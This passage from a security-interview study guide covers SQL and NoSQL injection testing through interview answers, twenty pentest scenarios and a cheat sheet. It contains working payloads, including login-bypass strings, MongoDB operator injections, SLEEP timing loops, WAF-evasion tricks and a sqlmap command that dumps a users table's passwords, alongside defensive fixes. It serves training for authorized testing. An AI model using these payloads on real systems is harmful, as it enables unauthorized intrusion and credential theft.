| **HTTP headers** | `X-Powered-By: PHP/...`, `Server: Apache` | `X-Powered-By: Express` |
| **API response structure** | Tabular/flat JSON from SQL ORM | Deeply nested JSON documents (reflects document-store structure) |
| **Wappalyzer/tech detection** | Identifies MySQL/PostgreSQL/MSSQL plugins | Identifies MongoDB/Express/Node.js |
| **Behavior with array params** | `?id[]=1` often throws error or ignored | `?id[]=1&id[]=2` may be processed natively (arrays are native to NoSQL) |

### Practical Test Sequence
```
1. Send '  → SQL error?            → Likely SQL
2. Send {"$ne": null} as a field  → Auth bypass?     → Likely NoSQL (MongoDB)
3. Check ID format in URLs/responses → ObjectId hex (24 chars)?  → MongoDB
4. Check Content-Type accepted    → Does app accept raw JSON bodies readily? → Common in NoSQL-backed APIs
5. Check error verbosity          → "MongoServerError", "CastError to ObjectId" → Confirms MongoDB
6. Try SLEEP(5) vs $where JS sleep → Confirms which engine responds
```

### Mixed Environments
Modern apps often use **both** — e.g., MySQL for transactional data + MongoDB/Elasticsearch for search/logging. Test each feature independently; don't assume one DB type for the entire app.

---

## 15. Interview Questions & Answers

### Q1: What's the difference between blind and error-based SQL injection?

**A:** Error-based SQLi leverages the application returning database error messages directly in the response, which can leak data (table names, column values) embedded in the error string. Blind SQLi occurs when no error or data is directly visible — the attacker infers true/false conditions through behavioral differences: page content/length changes (boolean-based) or response time delays (time-based).

---

### Q2: Why are parameterized queries effective against SQL injection?

**A:** Parameterized queries separate the SQL command structure from the data values at the database driver level. The query plan is compiled first with placeholders, and user input is then bound as literal data — never interpreted as executable SQL syntax, regardless of what characters it contains.

---

### Q3: Can an ORM be vulnerable to SQL injection?

**A:** Yes, when developers bypass the ORM's safe query builder and use raw SQL execution methods (e.g., Django's `.raw()` or `.extra()`, Sequelize's `sequelize.query()` with string concatenation, Hibernate's native SQL queries) with unsanitized input concatenated directly into the string.

---

### Q4: What is second-order SQL injection?

**A:** It's when malicious input is stored safely in one part of the application (e.g., parameterized insert during registration) but later retrieved and used unsafely in a different, non-parameterized query elsewhere in the app — causing the injection to trigger only when that second query executes.

---

### Q5: How does time-based blind SQLi work, and what are its limitations?

**A:** It uses conditional database sleep functions (`SLEEP()`, `WAITFOR DELAY`, `pg_sleep()`) — if the condition is true, the response is delayed by N seconds; if false, it returns immediately. Limitations: it's slow (each character requires multiple requests for binary search), network jitter can cause false positives/negatives, and it can be detected/throttled by WAFs monitoring for abnormal response times.

---

### Q6: What is the purpose of `--risk` and `--level` flags in sqlmap?

**A:** `--level` (1-5) controls how many test payloads and insertion points sqlmap tries — higher levels test more parameters including cookies and headers, and add more payload variations. `--risk` (1-3) controls how aggressive/potentially destructive the payloads are — risk 3 includes payloads that could modify data (e.g., heavy `OR`-based time-based payloads that could cause performance issues, or special operations).

---

### Q7: How would you find SQL injection in a code review without running the app?

**A:** Grep/search for string concatenation or formatting directly into SQL execution functions (`execute()`, `query()`, `createStatement()`), especially using `+`, f-strings, `%` formatting, or template literals with user input variables. Cross-reference against safe patterns (parameterized placeholders `?`/`%s`/named params). Also check ORM usage for raw query escape hatches.

---

### Q8: What's the difference between SQL injection and NoSQL injection at a conceptual level?

**A:** SQL injection exploits string concatenation that breaks SQL syntax structure. NoSQL injection (in document stores like MongoDB) typically exploits **type confusion** — sending an object/operator (`{"$ne": null}`) where a string was expected, manipulating the query's logical operators rather than breaking string syntax, since NoSQL queries are often built from JSON objects, not concatenated strings.

---

### Q9: Why can't blocklisting special characters fully prevent SQL injection?

**A:** Blocklists are inherently incomplete — attackers can use encoding (URL/Unicode/hex), case variation, alternative syntax (`||` instead of `+`), comment injection to split keywords, or entirely different injection vectors (numeric context without quotes) to bypass character filters. The only reliable fix is structural separation of code and data via parameterized queries.

---

### Q10: What database privileges should a web application account have, and why does this matter for SQLi impact?

**A:** The application's DB account should follow least privilege — typically `SELECT`, `INSERT`, `UPDATE` only on specific application tables, with NO `DROP`, `ALTER`, `GRANT`, or file/OS-level functions (`xp_cmdshell`, `LOAD_FILE`, `COPY...TO PROGRAM`) unless absolutely required. This limits the blast radius if SQLi is found — an attacker can't escalate to RCE or destroy the database even with a working injection.

---

## 16. Scenario-Based Questions & Answers (20)

---

### Scenario 1: 1000 Pages, 2-Day Deadline, Most Pages Look Vulnerable

**Q:** You've identified that most of 1000+ pages appear to have SQL injection. The deadline is 2 days. How do you approach confirming and reporting all of them efficiently?

**A:**

**Phase 1 — Triage & Pattern Recognition (Hours 1-3)**
- Don't test all 1000 pages individually. First identify **how many distinct parameter patterns/templates** exist. Most large apps reuse the same backend code across many pages (e.g., `?id=` used identically across 200 product pages built from the same template).
- Use Burp's site map to group endpoints by URL structure and parameter names.
- Sample 1 page per unique pattern/template, not every page.

**Phase 2 — Mass Automated Confirmation (Hours 3-8)**
```bash
# Export all in-scope URLs from Burp site map to a file
sqlmap -m urls.txt --batch --level=2 --risk=1 --threads=10 --output-dir=./results
```
- Use `sqlmap -m` (multiple targets mode) to test the entire URL list in one automated batch run.
- Use `--batch` to avoid manual prompts; `--threads=10` for speed; risk=1/level=2 initially to avoid false positives and keep it fast.

**Phase 3 — Validate Findings (Hours 8-16)**
- Cross-check sqlmap's "vulnerable" results — eliminate false positives (some pages slow due to server load, not actual time-based SQLi).
- Spot-check a sample of confirmed results manually in Repeater.

**Phase 4 — Categorize by Root Cause (Hours 16-20)**
- Group findings by the underlying shared code/template — report once per *root cause*, listing all affected URLs, instead of writing 1000 separate findings. This is both faster to write and far more useful to developers (fix once, fixes all).

**Phase 5 — Reporting (Hours 20-30)**
- Generate a master spreadsheet/report: Root Cause → Affected URL List → Payload → Evidence → Fix recommendation.
- Use sqlmap's automated reporting + Burp's "Report issues" combined, but consolidate by template, not by URL.

**Key Insight for Interview:** A senior tester doesn't brute-force 1000 manual tests under deadline — they **identify the shared code pattern, automate confirmation at scale, then consolidate reporting by root cause** to maximize speed and developer-fix efficiency.

---

### Scenario 2: SQLi Confirmed via sqlmap But App Uses an ORM

**Q:** The dev team insists they use an ORM (Sequelize) and therefore can't have SQL injection, but sqlmap confirms a time-based blind injection on a `sort` parameter. How do you explain this and what's likely happening?

**A:** This is almost always caused by the **`sort`/`order by` use case**, which ORMs frequently can't parameterize because `ORDER BY` clauses don't accept bound parameters in most SQL engines — column names and direction (ASC/DESC) must be inlined as raw identifiers. Developers often build this as:
```javascript
sequelize.query(`SELECT * FROM products ORDER BY ${req.query.sort} ${req.query.order}`)
```
This is a classic ORM-bypass scenario. I'd recommend an **allowlist** of permitted sort columns/directions (e.g., `{name: 'name', price: 'price'}`) and reject anything not in that list, rather than directly interpolating user input into the ORDER BY clause.

---

### Scenario 3: Time-Based Blind SQLi Suspected But Response Times Are Inconsistent

**Q:** You're testing a parameter with `SLEEP(5)` and sometimes get a 5-second delay, sometimes 2 seconds, sometimes instant. How do you confirm this is real SQLi and not just network noise?

**A:**
1. **Establish a baseline first** — send 5-10 requests with a non-injecting payload (`id=1`) and record average response time + variance.
2. **Send the SLEEP payload 5-10 times** and compare against baseline — look for a *consistent delta* (baseline + 5s), not just occasional spikes.
3. **Use differential payloads:** `SLEEP(0)` vs `SLEEP(5)` vs `SLEEP(10)` — confirm the delay scales proportionally with the sleep value (rules out coincidental server load).
4. **Test with conditional logic:** `IF(1=1,SLEEP(5),0)` vs `IF(1=2,SLEEP(5),0)` — only the true condition should delay; this rules out the parameter simply being slow for unrelated reasons.
5. **Use sqlmap's built-in statistical method** which already accounts for this — it sends multiple time-based requests and calculates a confidence threshold before confirming.

---

### Scenario 4: WAF Blocks All Your Classic Payloads

**Q:** Every payload with `OR`, `UNION`, `SELECT`, or `'` triggers a WAF block (403). The app is otherwise still suspected vulnerable. What's your approach?

**A:**
1. **Identify the WAF** (response headers, block page signature) — Cloudflare, AWS WAF, ModSecurity, etc. — different WAFs have different bypass techniques.
2. **Test encoding bypasses:**
   - URL double-encoding: `%2527` instead of `%27`
   - Case randomization: `UnIoN SeLeCT`
   - Comment-splitting: `UN/**/ION SEL/**/ECT`
3. **Test alternative syntax** that avoids blocked keywords entirely:
   - Use boolean logic without `OR`: `' AND '1'='1`
   - Use `HAVING`/`GROUP BY` instead of `WHERE` conditions where applicable.
4. **Switch injection channel** — if the WAF only inspects the URL/body but not headers, move the payload to `X-Forwarded-For` or `Referer`.
5. **Use sqlmap tamper scripts:** `--tamper=space2comment,charencode,randomcase`.
6. **Slow down requests** — many WAFs rate-limit and flag rapid-fire payload attempts; add delays (`--delay=3` in sqlmap).
7. **Test out-of-band (OOB)** — if in-band is fully blocked, OOB payloads via DNS exfiltration sometimes evade WAF detection since they don't contain typical SQL keywords in the visible parameter.

---

### Scenario 5: Login Bypass Works in Burp Repeater But Not in Browser

**Q:** Your payload `' OR '1'='1'-- -` successfully bypasses login in Burp Repeater, but typing the same payload into the browser login form fails. Why, and how do you fix your testing approach?

**A:** Likely causes:
1. **Client-side JavaScript validation/sanitization** strips or escapes special characters before the request is sent — Repeater bypasses the JS entirely by sending the raw HTTP request directly.
2. **CSRF token mismatch** — the browser form includes a fresh CSRF token tied to session state; if you're reusing an old Repeater request, the token may be stale and the server might reject it silently with different behavior.
3. **Different request encoding** — browser form submission may URL-encode the payload differently (e.g., `+` vs `%20` for spaces), altering how the server-side parses it.

**Fix:** Confirm exact request differences using Burp Proxy History — compare the browser-submitted request byte-for-byte against your Repeater request. This is also an important lesson: **client-side controls are not security boundaries** — always test via direct HTTP requests (Repeater/sqlmap), not just through the browser UI, since client-side filtering can mask a real server-side vulnerability.

---

### Scenario 6: SQLi Found in a Read-Only Reporting Feature — Is It Worth Escalating?

**Q:** You find SQLi in a "generate report" feature that only does `SELECT` queries (no INSERT/UPDATE/DELETE visible). The dev team says "low risk since it's read-only." How do you respond?

**A:** I'd push back — read-only SQLi is still high severity because:
1. **Data exfiltration is the primary risk**, not data modification — `SELECT` access alone can expose the entire database, including other tables unrelated to the reporting feature (via UNION-based extraction across `information_schema`).
2. Many DBMS allow **read-only contexts to still execute privileged read functions**, e.g., `LOAD_FILE()` in MySQL (reads OS files) — this isn't "modification" but is a severe information disclosure / potential RCE.
3. If the DB account is over-privileged (common misconfiguration), a "read-only" application feature could still permit attacker pivoting if the connection's actual database credentials have broader query rights than the application intends to use.
4. **Severity should be based on what's *possible*, not just what the application's intended functionality is.**

I'd demonstrate impact concretely — extract sensitive data from an unrelated table (with authorization) to make the business risk undeniable.

---

### Scenario 7: SQLi in a Microservices Architecture — Which Service Owns the Bug?

**Q:** You find a SQLi in an API Gateway endpoint, but the actual vulnerable query executes in a downstream microservice you don't have direct access to test. How do you handle attribution and reporting in this scenario?

**A:**
1. **Trace the request path:** Use response timing differences and error message leakage to infer which downstream service is actually executing the vulnerable query — the gateway is just a pass-through.
2. **Check distributed tracing headers** (`X-Request-ID`, `traceparent`) if available — correlate with logs/APM tools (Datadog, Jaeger) if you have access, to pinpoint the exact service.
3. **Report against the entry point AND the suspected backend service** — security findings should document the full request chain: "Vulnerability is exploitable via API Gateway endpoint `/api/v1/search`, root cause traced to the `search-service` microservice's database query layer."
4. **Recommend defense in depth:** Even if the gateway isn't the root cause, it should still implement input validation as a first line of defense, in addition to fixing the actual vulnerable service.
5. Coordinate with the platform/API team to identify service ownership via the service registry or on-call rotation if unclear.

---

### Scenario 8: Numeric ID Parameter Returns Identical Response for `id=1` and `id=1 AND 1=2`

**Q:** You test `?id=1` and `?id=1 AND 1=2` and get the exact same page response both times. Does this mean it's not vulnerable? What else would you check?

**A:** Not necessarily — this could mean:
1. **The parameter isn't reaching the SQL query at all** (e.g., it's used for caching/logging only, or there's a hardcoded value override).
2. **The application has generic error handling** that returns the same page regardless of query success/failure (common defensive coding, but doesn't rule out the underlying query being vulnerable).
3. **The query might be wrapped in a try/catch that silently fails**, returning a default/cached response.

**What I'd check next:**
- Try a **type-confusion test:** `id=1-1` (should behave like `id=0`) vs `id=2-1` (should behave like `id=1`) — if responses differ accordingly, the value IS being evaluated arithmetically, meaning blind injection is still plausible, just not via this particular boolean technique.
- Switch to **time-based testing**: `id=1 AND SLEEP(5)` — completely bypasses content-based blind detection.
- Check if the **same parameter is used elsewhere** in the app (e.g., an export/print view of the same data) where error handling might differ.
- Test a **second-order angle** — does this ID value get stored and reused in another query later?

---

### Scenario 9: You Have Limited Time and Can Only Manually Test 10 of 200 Similar Endpoints

**Q:** You're given 200 endpoints that look structurally identical (same parameter names, same likely backend pattern) but only have time to manually deep-test 10. How do you choose which 10, and how do you justify skipping the rest?

**A:**
1. **Select for diversity, not redundancy** — pick endpoints that represent different *functional categories* (e.g., one search endpoint, one filter endpoint, one sort endpoint, one ID lookup, one export feature) rather than 10 nearly-identical product pages.
2. **Prioritize by business impact** — endpoints touching authentication, payment, or PII data take priority over cosmetic/display-only endpoints.
3. **Run automated coverage on the remaining 190** — use sqlmap in batch mode (`-m urls.txt --batch --level=2`) as a baseline safety net, even if not deeply manual-tested, so nothing is completely unchecked.
4. **Document the sampling methodology explicitly in the report**: "10 endpoints representing X distinct code patterns were manually deep-tested; remaining 190 structurally similar endpoints were automated-scanned with sqlmap. If manual findings confirm vulnerability in a given pattern, all endpoints sharing that pattern should be treated as vulnerable until the shared code is fixed and verified."
5. This demonstrates **risk-based testing methodology** — a core skill that separates senior testers from those who test exhaustively without prioritization.

---

### Scenario 10: Application Returns Generic 500 Error for Every Single Request, Even Valid Ones

**Q:** Every request to a particular endpoint — valid or malicious — returns a generic 500 error. How do you determine if SQL injection testing is even possible here, and what's your approach?

**A:**
1. **First confirm baseline behavior is actually broken**, not a testing artifact — check if the endpoint works at all with a completely clean, known-good request (e.g., replay a captured legitimate request from a different user session).
2. **If genuinely broken for all input** — this might indicate the backend/service is down, misconfigured, or there's an environment issue unrelated to your testing; report as a functional bug, not a security finding (though note that **verbose 500 errors themselves can be an information disclosure risk** if they leak stack traces).
3. **If it's a WAF or rate limiter** triggering blanket 500s after a threshold — slow down requests, check for rate-limit headers (`Retry-After`, `X-RateLimit-Remaining`), and resume testing with delays.
4. **Check response time variance even within the 500 errors** — paradoxically, you can still perform time-based blind SQLi even if every response is a 500, as long as the *timing* of the 500 still correlates with your injected conditional logic (e.g., `SLEEP(5)` still delays even if the final response is an error).
5. **Try a different endpoint/parameter on the same backend** that returns 200 normally — confirms whether the issue is endpoint-specific or environment-wide.

---

### Scenario 11: You Suspect SQLi But the App Uses GraphQL, Not REST

**Q:** The target uses GraphQL exclusively. How does your SQL injection testing methodology change?

**A:**
1. **Identify the resolvers** — GraphQL endpoints typically have a single URL (`/graphql`), but each query/mutation maps to a backend resolver function that may construct SQL internally.
2. **Use introspection** (if enabled) to enumerate all available queries/mutations and their arguments — each argument is a potential injection point:
   ```graphql
   {__schema{types{name fields{name args{name}}}}}
   ```
3. **Test each argument individually**, even nested ones:
   ```graphql
   query { user(id: "1' OR '1'='1") { name email } }
   ```
4. **Test filter/search arguments specifically** — GraphQL APIs often expose flexible filter objects (`where: {name: {contains: "x"}}`) that map directly to dynamic SQL `WHERE`/`LIKE` clauses — these are prime injection targets.
5. **Use GraphQL Raider (Burp extension)** to convert GraphQL operations into individually testable requests compatible with Burp's scanner and sqlmap (sqlmap can target individual extracted requests via `-r`).
6. **Check batching/aliasing for blind injection chains** — multiple aliased queries in one request let you test multiple payloads simultaneously, useful for faster blind extraction.

---

### Scenario 12: Found SQLi During a Pentest, But It's in a Third-Party Vendor's Code You Can't Modify

**Q:** You find SQLi in a third-party plugin/library integrated into the client's application. The client can't patch the vendor's code directly. What do you recommend?

**A:**
1. **Document the finding with full technical detail** and clearly attribute it to the third-party component (name, version) — recommend the client report it to the vendor (and check if it's a known CVE already).
2. **Recommend compensating controls** while waiting for a vendor patch:
   - WAF rule specifically targeting the vulnerable parameter/endpoint.
   - Reverse proxy-level input validation/sanitization in front of the vulnerable component.
   - Restrict network/application access to the vulnerable feature if it's not business-critical.
   - Reduce the database account's privileges used by that specific component (least privilege containment).
3. **Check for an updated version** of the vendor library/plugin that may have already fixed it.
4. **Advise on responsible disclosure** to the vendor if no CVE exists yet, following standard coordinated disclosure timelines.
5. **Flag this as supply chain risk** in the broader report — recommend the client implement a process for tracking third-party component vulnerabilities going forward (SCA tooling, dependency scanning).

---

### Scenario 13: sqlmap Says "Not Injectable" But Manual Testing Suggests Otherwise

**Q:** sqlmap reports the parameter is not injectable after a full scan, but your manual testing with `' AND SLEEP(5)--` shows a clear delay. What's going wrong and how do you proceed?

**A:**
1. **Check sqlmap's exact request format** vs your manual request — sqlmap might be sending a different `Content-Type`, missing a required header, or not including session cookies needed to reach the vulnerable code path.
2. **Use `-r request.txt`** with your exact captured Burp request (including all headers/cookies) instead of `-u` with just the URL — this ensures sqlmap replicates your manual context exactly.
3. **Increase `--level` and `--risk`** — by default sqlmap may not test that specific parameter location (e.g., if it's in a header or a less common insertion point) without higher level settings.
4. **Specify the exact technique:** `--technique=T` to force time-based testing only, since sqlmap might be giving up after boolean/error tests fail and not adequately testing time-based.
5. **Check for sqlmap's built-in false-positive avoidance** — it may be discounting your timing due to inconsistent baseline; manually verify your own SLEEP payload is consistent (re-run 5x) before concluding sqlmap is wrong.
6. **Mark the injection point explicitly** using `*` in the request file if sqlmap isn't correctly auto-detecting the parameter location.

---

### Scenario 14: Client Insists Their App Is Safe Because They Use Stored Procedures

**Q:** The client says "We use stored procedures everywhere, so we're safe from SQL injection." How do you respond, and what would you test to verify or disprove this claim?

**A:** Stored procedures are **not automatically safe** — they only prevent injection if they don't internally build dynamic SQL via string concatenation. I'd test:
1. **Identify if any stored procedures use dynamic SQL internally** — e.g., MSSQL procs using `EXEC(@sql)` or `sp_executesql` with concatenated strings instead of parameters.
2. **Test application-layer calls to stored procedures** — even if the *procedure* itself is safe, the application code calling it might still concatenate user input into the procedure call string rather than using proper parameter binding (`CALL proc(?)`).
3. **Request source code access** (gray-box) to review stored procedure definitions directly — fastest way to confirm if any use unsafe dynamic SQL construction.
4. **Black-box test anyway** — send injection payloads to every parameter regardless of the "stored procedure" claim; if dynamic SQL is used internally, payloads will still trigger errors/delays exactly like classic SQLi.

---

### Scenario 15: You Find SQLi in a Staging Environment But It's Not Reproducible in Production

**Q:** The same payload works in staging but fails in production for the identical endpoint. How do you investigate this discrepancy?

**A:**
1. **Check for environment-specific WAF/CDN** — production often sits behind Cloudflare/AWS WAF while staging doesn't; the vulnerability may be identical, but production has an additional protective layer blocking the payload.
2. **Check for different code versions** — staging may be running a newer/older build than production; confirm via version headers, deployment logs, or asking the dev team for the exact commit/branch deployed to each environment.
3. **Check for different database configurations** — production might use stricter SQL modes (e.g., MySQL `STRICT_TRANS_TABLES`), different DBMS versions, or additional input validation middleware not present in staging.
4. **Check for different feature flags / config** — some apps disable verbose error messages or certain features in production via environment variables, masking the same underlying vulnerable code path.
5. **Report based on root cause, not environment** — if the vulnerable code is confirmed identical between environments (via code review), report it as a production risk regardless of whether the exact same payload reproduces, since WAF bypass techniques could still get through given enough attempts; recommend fixing the code, not relying on the WAF as the only protection.

---

### Scenario 16: Boolean-Based Blind SQLi Confirmed, But You Need to Extract Data Fast Within a Tight Deadline

**Q:** You've confirmed boolean-based blind SQLi but extracting the admin password character-by-character via binary search would take hours given the deadline. What faster alternatives do you use?

**A:**
1. **Switch to sqlmap immediately** for automated extraction — manual binary search is for *confirmation*, not bulk extraction; sqlmap optimizes character extraction far faster than manual testing:
   ```bash
   sqlmap -r request.txt --technique=B -D dbname -T users -C password --dump --threads=10
   ```
2. **Use `--threads`** to parallelize requests (sqlmap supports up to 10 concurrent threads safely).
3. **If UNION-based is also possible alongside blind**, switch technique entirely — UNION extraction retrieves full rows in a single request instead of bit-by-bit inference, which is dramatically faster.
4. **If boolean-only and time is critical**, consider whether **partial extraction** is sufficient for the report (e.g., proving you can extract the first few characters of a hash is often enough to demonstrate severity — full extraction isn't always necessary to prove impact within a deadline).
5. **Use error-based as a fallback test** even if not the primary confirmed method — sometimes a secondary error-based vector exists on the same parameter that extracts data far faster than blind techniques.

---

### Scenario 17: You Need to Test for SQLi on a Mobile App's Backend API, Not a Web Browser

**Q:** You're testing a mobile app (iOS/Android) backend API. How does your methodology differ from testing a typical web application for SQL injection?

**A:**
1. **Set up a proxy for mobile traffic** — configure the device/emulator to route through Burp (`127.0.0.1:8080`), install Burp's CA cert on the device, and handle certificate pinning if present (use Frida/Objection to bypass SSL pinning on iOS/Android).
2. **Capture the full API traffic** — mobile apps often use REST/GraphQL/gRPC; identify the exact request format (JSON body, custom headers, binary protocols like Protobuf).
3. **Reverse engineer API parameters** if obfuscated — decompile the APK (`jadx`/`apktool`) or use Frida to hook network calls and observe parameter names not visible in typical traffic.
4. **Test the same injection points** as web — query params, JSON body fields, headers (especially custom auth headers like `X-API-Key`, `X-Device-ID` which are often unexpectedly logged into SQL queries).
5. **Pay special attention to offline-sync/caching endpoints** — mobile apps frequently have bulk-sync APIs (`/sync`, `/batch-update`) that process large nested JSON payloads with less rigorous validation than primary user-facing endpoints.
6. **Use sqlmap against the extracted API requests** the same way as web — sqlmap doesn't care if the client was a browser or mobile app; once you have the raw HTTP request (`-r request.txt`), the testing methodology is identical.

---

### Scenario 18: Found SQLi, But Database is MongoDB (Not Actually SQL) — Junior Tester Confused

**Q:** A junior tester reports "I tried `' OR 1=1--` and the app didn't break, so it must be NoSQL/not vulnerable." How do you mentor them through correctly testing this MongoDB-backed app?

**A:**
1. **Explain the type confusion mindset shift** — classic SQL payloads with quotes and SQL keywords won't work against MongoDB because there's no SQL parser to break; the injection mechanism is fundamentally different (operator injection via JSON, not string escaping).
2. **Walk through testing methodology:**
   - Switch `Content-Type` to `application/json` if not already.
   - Replace expected string values with MongoDB operators: `{"username": "admin", "password": {"$ne": null}}`.
   - Test URL-encoded array/object syntax: `?password[$ne]=1`.
3. **Show how to confirm via response difference** — a successful operator injection often results in authentication bypass or returning more records than expected (e.g., a search returning all users instead of one).
4. **Recommend NoSQLMap tool** for automated testing once a manual proof-of-concept is found.
5. **Key mentoring point:** Teach them to **fingerprint the backend first** (check error messages, ID format, response structure) before choosing which injection family (SQL vs NoSQL) to test — applying SQL payloads to a NoSQL backend is a common junior mistake that leads to false "not vulnerable" conclusions.

---

### Scenario 19: SQLi Payload Works on `GET /search?q=` But Same Logic Fails on `POST /search` With JSON Body

**Q:** The GET version of a search endpoint is vulnerable to SQLi, but the POST version with a JSON body (`{"query": "test"}`) doing the same backend search doesn't trigger the same behavior. Why might this be, and how do you adapt your testing?

**A:**
1. **Different code paths** — despite "the same search," GET and POST handlers are often implemented by different developers/times and may use entirely different query construction logic (one parameterized, one not) — don't assume shared logic just because the feature looks the same.
2. **Content-Type parsing differences** — if the POST body isn't being parsed/deserialized correctly (e.g., wrong `Content-Type` header), your injected payload might be getting treated as a single literal string rather than reaching the intended field — verify the request is actually being processed as expected (check the response reflects your input at all).
3. **JSON escaping differences** — when your payload contains a `"` character, it might break the JSON structure itself before it even reaches the SQL query — you may need to properly escape the JSON wrapper while still injecting SQL-breaking characters within the string value:
   ```json
   {"query": "test' OR '1'='1"}
   ```
   vs malformed:
   ```json
   {"query": "test" OR "1"="1"}    // breaks JSON, never reaches backend
   ```
4. **Test independently, not by analogy** — always treat each endpoint/method combination as a separate attack surface; "the same feature" at the UI level often maps to genuinely different backend code.

---

### Scenario 20: Automated Scan Flags 50 "Possible SQLi" Findings — Most Look Like False Positives. How Do You Triage at Scale?

**Q:** Burp/sqlmap automated scanning across a large app returns 50 "possible SQL injection" findings, but you suspect most are false positives (especially time-based ones). How do you efficiently triage all 50 within limited time?

**A:**
1. **Sort by detection technique first** — error-based and UNION-based findings are almost always true positives (they require an actual successful exploit to trigger); time-based and boolean-based blind findings have the highest false-positive rate due to network jitter and server load variance. Prioritize manual verification on the blind findings.
2. **Batch-verify time-based findings using a scripted approach:**
   ```bash
   # Re-test each flagged endpoint with differential SLEEP(0) vs SLEEP(5) 5 times each
   for url in flagged_urls; do
     time curl "$url?id=1' AND SLEEP(0)--"
     time curl "$url?id=1' AND SLEEP(5)--"
   done
   ```
   Findings showing a consistent ~5 second delta across multiple runs are likely true positives; inconsistent/marginal deltas are likely false positives caused by server load.
3. **Group findings by shared parameter/endpoint pattern** — like the 1000-page scenario, many of the 50 likely point to the same root cause across similar pages; verify one representative from each group rather than all 50 individually.
4. **Use sqlmap directly against each flagged URL with `--technique` isolated** to cross-confirm Burp's finding — if sqlmap independently confirms via a different detection engine, confidence increases significantly.
5. **Discard findings that don't reproduce on 3 consecutive manual attempts** — document them as "automated scanner false positive, manually verified not exploitable" so the report remains credible and developers don't waste time chasing noise.
6. **Final output:** A report with confirmed findings clearly separated from "informational/needs further review" findings — never present unverified automated scanner output as confirmed vulnerabilities in a professional report.

---

## Quick Reference — SQL vs NoSQL Cheat Sheet

```
SQL DETECTION        → ' " ` breaks query, classic syntax errors
NOSQL DETECTION       → {"$ne": null}, {"$gt": ""}, operator-based bypass
SQL CONFIRM           → SLEEP(5), UNION SELECT, extractvalue()
NOSQL CONFIRM         → $where JS injection, $regex extraction, array param parsing
SQL TOOL              → sqlmap
NOSQL TOOL            → NoSQLMap, manual JSON operator testing
SQL ID FORMAT         → Sequential integers
NOSQL ID FORMAT       → ObjectId hex (24 chars), UUID
SQL ERROR SIGNATURE   → "SQL syntax", "ORA-", "Microsoft SQL Server"
NOSQL ERROR SIGNATURE → "MongoError", "CastError", "BSON"
```

---

*Maintained for security engineers preparing for interviews and real-world engagements. Always operate within authorized scope.*
